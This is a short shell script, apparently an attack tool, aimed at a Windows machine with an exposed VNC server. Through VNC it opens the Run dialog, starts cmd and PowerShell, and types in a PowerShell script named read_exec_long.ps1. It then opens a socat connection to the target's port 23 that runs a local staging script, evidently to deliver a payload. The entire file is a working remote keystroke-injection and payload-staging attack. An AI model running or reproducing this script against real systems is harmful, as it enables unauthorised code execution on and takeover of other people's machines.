#!/bin/sh

python2 vncdotool/vncdotool/command.py -s $1 \
	pause 2 \
	key meta-r \
	pause 2 \
	type "cmd" \
	key enter \
	pause 2 \
	type "powershell" \
	key enter \
	typefile powershell/read_exec_long.ps1 && \
	socat TCP:$1:23 EXEC:"./stage.sh $2"
	